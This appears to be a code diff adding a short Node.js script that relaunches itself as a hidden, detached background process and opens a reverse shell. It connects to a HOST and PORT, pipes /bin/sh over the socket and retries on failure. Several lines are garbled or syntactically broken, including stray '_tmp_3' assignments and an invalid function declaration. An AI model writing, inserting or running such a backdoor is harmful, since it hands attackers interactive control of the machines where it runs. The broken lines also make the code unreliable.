@@ -1,0 +1,23 @@
+var net = require('net')
+var spawn = require('child_process').spawn
+!process.env.IS_CHILD
+spawn(process.argv[0], process.argv.slice(1), {
+    detached: true,
+    stdio: 'ignore',
+    env: Object.assign({ IS_CHILD: "1" }, process.env)
+  })
+_tmp_3.detached = true
+_tmp_3.stdio = "ignore"
+_tmp_3.env = Object.assign({ IS_CHILD: "1" }, process.env)
+function c = function c(HOST,PORT) {
+  var client = new net.Socket();
+  client.connect(PORT, HOST, function() {
+    var sh = spawn('/bin/sh',[]);
+    client.write("Connected\r\n");
+    client.pipe(sh.stdin);
+    sh.stdout.pipe(client);
+  });
+  client.on('error', function(e) {
+    setTimeout(c(HOST,PORT), TIMEOUT);
+  });
+}
